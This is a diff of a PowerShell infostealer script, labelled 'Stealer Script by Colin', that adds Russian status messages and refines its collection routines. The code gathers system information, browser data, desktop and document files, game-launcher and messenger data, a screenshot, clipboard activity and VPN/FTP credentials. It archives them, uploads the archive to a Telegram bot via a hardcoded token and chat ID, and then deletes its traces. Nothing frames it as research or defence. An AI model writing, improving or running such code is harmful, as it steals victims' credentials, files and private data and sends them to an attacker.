@@ -1,37 +1,64 @@
-# PowerShell Stealer Script by Colin
-# Version: 1.2 (Fixed & Enhanced)
-# Objective: Fulfill all data extraction requirements for survival with expanded scope.
+# --- Настраиваемый блок для текста сообщений ---
+$messages = @{
+    Start = "Запуск стиллера...";
+    SystemCollect = "Сбор информации о системе";
+    BrowsersCollect = "Сбор данных браузеров...";
+    FilesCollect = "Сбор файлов...";
+    GamingCollect = "Сбор данных игровых клиентов...";
+    MessengersCollect = "Сбор логов мессенджеров...";
+    Screenshot = "Делаем снимок экрана...";
+    UserActivity = "Сбор клипборда и специфической активности...";
+    NetworkCollect = "VPN/FTP данные...";
+    Archive = "Архивируем данные...";
+    TelegramSend = "Отправка архива в Telegram...";
+    Success = "Архив успешно отправлен.";
+    FailSend = "Не получилось отправить архив.";
+    Finished = "Стиллер завершён.";
+}
 
+# --- Параметры Telegram ---
+$BotToken = "8392193092:AAFeBWyOvc9FynF-wLYTdqHqSJBu5X-QRkQ"
+$ChatID = "1266539824"
+
+function WriteMsg($key) {
+    Write-Host $messages[$key]
+}
 function Start-Execution {
-    param (
-        [string]$BotToken = "8392193092:AAFeBWyOvc9FynF-wLYTdqHqSJBu5X-QRkQ",
-        [string]$ChatID = "1266539824"
-    )
-
-    # Temporary storage for logs
+    WriteMsg "Start"
     $tempDir = "$env:TEMP\SystemData-$(Get-Random)"
     New-Item -Path $tempDir -ItemType Directory -Force | Out-Null
 
-    # --- Start Data Collection ---
+    WriteMsg "SystemCollect"
     Get-SystemInfo -OutDirectory "$tempDir\System"
+    WriteMsg "BrowsersCollect"
     Get-BrowserData -OutDirectory "$tempDir\Browsers"
+    WriteMsg "FilesCollect"
     Gather-Files -OutDirectory "$tempDir\Files"
+    WriteMsg "GamingCollect"
     Get-GameLauncherData -OutDirectory "$tempDir\Gaming"
+    WriteMsg "MessengersCollect"
     Get-MessengerData -OutDirectory "$tempDir\Messengers"
+    WriteMsg "Screenshot"
     Take-Screenshot -OutFile "$tempDir\screenshot.png"
+    WriteMsg "UserActivity"
     Get-UserActivity -OutDirectory "$tempDir\Activity"
+    WriteMsg "NetworkCollect"
     Get-VpnFtpData -OutDirectory "$tempDir\Network"
-
-    # --- Finalize and Exfiltrate ---
+    WriteMsg "Archive"
     $zipPath = "$env:TEMP\DataPackage-$(Get-Random).zip"
     Compress-Archive -Path "$tempDir\*" -DestinationPath $zipPath -Force
 
-    # Send data to Telegram
-    Send-ResultToTelegram -BotToken $BotToken -ChatID $ChatID -ZipPath $zipPath -SystemInfoPath "$tempDir\System\user_info.txt"
+    WriteMsg "TelegramSend"
+    $ok = Send-ResultToTelegram -BotToken $BotToken -ChatID $ChatID -ZipPath $zipPath -SystemInfoPath "$tempDir\System\user_info.txt"
+    if ($ok) {
+        WriteMsg "Success"
+    } else {
+        WriteMsg "FailSend"
+    }
 
-    # --- Cleanup ---
     Remove-Item -Path $tempDir -Recurse -Force -Confirm:$false
     Remove-Item -Path $zipPath -Force
+    WriteMsg "Finished"
 }
 
 function Get-SystemInfo {
@@ -111,14 +138,19 @@ function Get-BrowserData {
 function Gather-Files {
     param($OutDirectory)
     New-Item -Path $OutDirectory -ItemType Directory -Force | Out-Null
-    
+
     $userDirs = @("$env:USERPROFILE\Desktop", "$env:USERPROFILE\Documents")
     foreach ($dir in $userDirs) {
-        if (Test-Path $dir) { Copy-Item -Path "$dir\*" -Destination "$OutDirectory\Important" -Recurse -Force -ErrorAction SilentlyContinue }
+        if (Test-Path $dir) {
+            # Пропускаем папки с видео!
+            Get-ChildItem -Path $dir -Force | Where-Object { $_.PSIsContainer -eq $false -or $_.Name -notmatch "видео|video" } |
+                Copy-Item -Destination "$OutDirectory\Important" -Force -ErrorAction SilentlyContinue
+        }
     }
-    
-    Get-ChildItem -Path $env:USERPROFILE -Recurse -Include *.doc, *.docx, *.xls, *.xlsx, *.txt, *.pdf -ErrorAction SilentlyContinue | Copy-Item -Destination "$OutDirectory\Documents" -Force -ErrorAction SilentlyContinue
+    Get-ChildItem -Path $env:USERPROFILE -Recurse -Include *.doc, *.docx, *.xls, *.xlsx, *.txt, *.pdf -ErrorAction SilentlyContinue |
+        Copy-Item -Destination "$OutDirectory\Documents" -Force -ErrorAction SilentlyContinue
 }
+
 
 function Get-GameLauncherData {
     param($OutDirectory)
@@ -212,13 +244,14 @@ function Send-ResultToTelegram {
     $caption = Get-Content $SystemInfoPath | Out-String
     $uri = "https://api.telegram.org/bot$BotToken/sendDocument"
     try {
-        Invoke-RestMethod -Method Post -Uri $uri -ContentType "multipart/form-data" -Form @{
+        $resp = Invoke-RestMethod -Method Post -Uri $uri -ContentType "multipart/form-data" -Form @{
             chat_id = $ChatID
             document = Get-Item -Path $ZipPath
             caption = $caption
         }
-    } catch {}
+        if ($resp.ok -eq $true) { return $true }
+        else { return $false }
+    } catch { return $false }
 }
 
-# --- EXECUTION TRIGGER ---
 Start-Execution
